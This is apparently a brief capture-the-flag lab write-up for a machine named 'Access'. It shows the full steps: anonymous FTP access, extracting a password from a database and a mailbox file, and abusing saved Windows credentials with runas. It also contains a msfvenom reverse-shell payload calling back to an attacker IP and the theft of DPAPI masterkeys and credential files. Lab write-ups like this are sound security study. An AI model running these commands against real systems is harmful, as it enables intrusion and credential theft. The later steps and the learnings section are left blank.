# CTF Writeup: Access

---

- Step 1: added <target_ip> to /etc/hosts and ran nmap scan --> 21,23 & 80 are open
- Step 2: logged into ftp anonymously and retrieved .zip & .mdb files locally.
- Step 3: installed mdb-tools and made mdb-tables backup.mdb & mdb-export backup.mdb auth_user
- Step 4: retrieved creds --> unzipped the .zip file with password from creds and gained .pst file
- Step 5: which is an outlook file --> installed tool "readpst" to read it. 
- Step 6: made readpst <.pst_file> --> received new creds security:4Cc3ssC0ntr0ller.
- Step 7: logged into telnet and retrieved user.txt on Desktop.
- Step 8: found binary ZKAccess3.5 made type "<binary>" and retrieved information about
runas.exe possibily running on admin privs
- Step 9: made runas /user:Administrator /noprofile /savecred "cmd.exe /c type C:\users\administrator\desktop\root.txt > C:\Users\security\desktop\flag.txt"
- Step 10: retrieved root.txt
- Step 11: to gain foothold onto the system I created a payload revshell.exe
--> made msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.187 LPORT=4444 -f exe -a x86 --platform Windows > revshell.exe
- Step 12: opened up metasploit --> msfconsole -q --> use exploit/multi/handler --> set PAYLOAD windows/meterpreter/reverse_tcp --> set LHOST --> <machine_ip>
- Step 13: made runas /user:access\administrator /savecreds "revshell.exe"
- Step 14: gained meterpreter session as administrator.
- Step 15: went into C:\Users\security\AppData\Roaming\Microsoft\Protect and retrieved masterkey & went to credentials directory and retrieved credentials. 
- Step 16: made certutil -encode <masterkey> && certutil -encode <credentials> to base64 encode them and downloaded them locally.
- Step 17: made base64 -d on both of them and saved them.
- Step 18: 
- Step 19:
- Step 20:

---

## Key Learnings

-
-
-
-
